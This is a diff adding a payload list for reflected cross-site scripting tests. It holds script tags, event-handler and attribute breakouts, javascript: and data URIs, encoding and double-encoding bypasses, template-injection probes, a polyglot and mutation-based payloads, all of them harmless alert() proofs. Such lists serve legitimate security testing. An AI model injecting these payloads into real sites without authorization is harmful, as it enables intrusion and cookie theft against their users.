@@ -1,0 +1,66 @@
+# XSS Payloads — Reflected Cross-Site Scripting
+# Each line is a test payload injected into form fields / URL params
+
+# Basic script injection
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Attribute-based
+"><script>alert("XSS")</script>
+'><script>alert("XSS")</script>
+" onfocus="alert('XSS')" autofocus="
+' onfocus='alert(1)' autofocus='
+" onmouseover="alert('XSS')"
+" autofocus onfocus="alert(1)"
+
+# Event handlers
+<img src=x onerror=alert("XSS")>
+<img src=x onerror="alert('XSS')">
+<svg/onload=alert("XSS")>
+<svg onload="alert(1)">
+<body onload=alert("XSS")>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# JavaScript URI
+javascript:alert('XSS')
+javascript:alert(1)//
+
+# HTML encoding bypass
+&#60;script&#62;alert(1)&#60;/script&#62;
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# Template injection (SSTI)
+{{73*73}}
+${73*73}
+#{73*73}
+<%= 73*73 %>
+
+# Data URI
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+
+# Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# DOM-based XSS
+<img src=1 onerror=alert(document.domain)>
+<img src=1 onerror=alert(document.cookie)>
+
+# Iframe injection
+<iframe src="javascript:alert(1)">
+<iframe/onload=alert(1)>
+
+# Object / Embed
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# Mutation-based (mXSS)
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x">
